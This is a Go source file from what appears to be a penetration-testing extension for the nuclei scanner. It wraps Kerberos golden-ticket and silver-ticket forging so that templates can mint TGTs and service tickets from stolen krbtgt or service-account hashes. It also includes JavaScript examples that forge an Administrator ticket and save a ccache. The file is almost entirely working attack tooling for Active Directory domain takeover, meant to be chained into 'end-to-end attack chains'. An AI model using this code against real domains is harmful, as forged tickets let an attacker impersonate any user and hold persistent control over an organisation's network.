// Package krbforge wraps mandiant/gopacket's Kerberos ticket forging primitives
// (golden / silver tickets) for use from nuclei javascript templates.
//
// Forging requires the krbtgt NT hash (golden) or a service-account hash
// (silver) - obtained from secretsdump / dcsync. Templates can chain this with
// the dcerpc lib to produce end-to-end attack chains entirely in nuclei.
package krbforge

import (
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"

	gpkrb "github.com/Mzack9999/goimpacket/pkg/kerberos"
)

// TicketRequest mirrors gopacket's TicketConfig with json-friendly tags.
type TicketRequest struct {
	Username       string   `json:"username"`
	Domain         string   `json:"domain"`
	DomainSID      string   `json:"domain_sid"`
	NTHash         string   `json:"nthash,omitempty"`
	AESKey         string   `json:"aes_key,omitempty"`
	SPN            string   `json:"spn,omitempty"`
	UserID         uint32   `json:"user_id,omitempty"`
	PrimaryGroupID uint32   `json:"primary_group_id,omitempty"`
	Groups         []uint32 `json:"groups,omitempty"`
	ExtraSIDs      []string `json:"extra_sids,omitempty"`
	DurationHours  int      `json:"duration_hours,omitempty"`
	KVNO           int      `json:"kvno,omitempty"`
	OutputFile     string   `json:"output_file,omitempty"`
}

// Ticket is the forged ticket plus metadata.
type Ticket struct {
	HexTicket  string `json:"ticket_hex"`
	HexKey     string `json:"session_key_hex"`
	EncType    int32  `json:"enc_type"`
	OutputFile string `json:"output_file,omitempty"`
}

// CreateGoldenTicket forges a TGT for the supplied user against the given
// realm using the krbtgt NT hash (or AES key). It returns the ASN.1-encoded
// ticket and the session key. If req.OutputFile is empty no file is written;
// pass an absolute path to also persist a ccache.
//
// @example
// ```javascript
// const krb = require('nuclei/krbforge');
// const t = krb.CreateGoldenTicket({
//   username: 'Administrator',
//   domain:   'acme.local',
//   domain_sid: 'S-1-5-21-1004336348-1177238915-682003330',
//   nthash:   '31d6cfe0d16ae931b73c59d7e0c089c0',
// });
// log(t.ticket_hex);
// ```
func CreateGoldenTicket(req TicketRequest) (*Ticket, error) {
	cfg := buildConfig(req, "")
	if cfg.OutputFile == "" {
		cfg.OutputFile = "-"
	}
	res, err := gpkrb.CreateTicket(cfg)
	if err != nil {
		return nil, err
	}
	return &Ticket{
		HexTicket:  hex.EncodeToString(res.Ticket),
		HexKey:     hex.EncodeToString(res.SessionKey),
		EncType:    res.EncType,
		OutputFile: cfg.OutputFile,
	}, nil
}

// CreateSilverTicket forges a service ticket (TGS) for the supplied SPN. The
// hash supplied must belong to the service account that owns the SPN (e.g.
// the machine account NT hash for cifs/host SPNs).
//
// @example
// ```javascript
// const krb = require('nuclei/krbforge');
// const t = krb.CreateSilverTicket({
//   username: 'Administrator',
//   domain:   'acme.local',
//   domain_sid: 'S-1-5-21-1004336348-1177238915-682003330',
//   nthash:   '31d6cfe0d16ae931b73c59d7e0c089c0',
//   spn:      'cifs/server01.acme.local',
// }, '/tmp/silver.ccache');
// log(t.output_file);
// ```
func CreateSilverTicket(req TicketRequest, outputFile string) (*Ticket, error) {
	if req.SPN == "" {
		return nil, fmt.Errorf("spn is required for silver ticket")
	}
	cfg := buildConfig(req, outputFile)
	res, err := gpkrb.CreateTicket(cfg)
	if err != nil {
		return nil, err
	}
	return &Ticket{
		HexTicket:  hex.EncodeToString(res.Ticket),
		HexKey:     hex.EncodeToString(res.SessionKey),
		EncType:    res.EncType,
		OutputFile: cfg.OutputFile,
	}, nil
}

func buildConfig(req TicketRequest, outputFile string) *gpkrb.TicketConfig {
	if outputFile == "" {
		outputFile = req.OutputFile
	}
	if outputFile != "" && outputFile != "-" {
		// reject relative paths to keep the ccache out of CWD
		if !filepath.IsAbs(outputFile) {
			outputFile = filepath.Join(os.TempDir(), outputFile)
		}
	}
	return &gpkrb.TicketConfig{
		Username:       req.Username,
		Domain:         req.Domain,
		DomainSID:      req.DomainSID,
		NTHash:         req.NTHash,
		AESKey:         req.AESKey,
		SPN:            req.SPN,
		UserID:         req.UserID,
		PrimaryGroupID: req.PrimaryGroupID,
		Groups:         req.Groups,
		ExtraSIDs:      req.ExtraSIDs,
		Duration:       req.DurationHours,
		KVNO:           req.KVNO,
		OutputFile:     outputFile,
	}
}
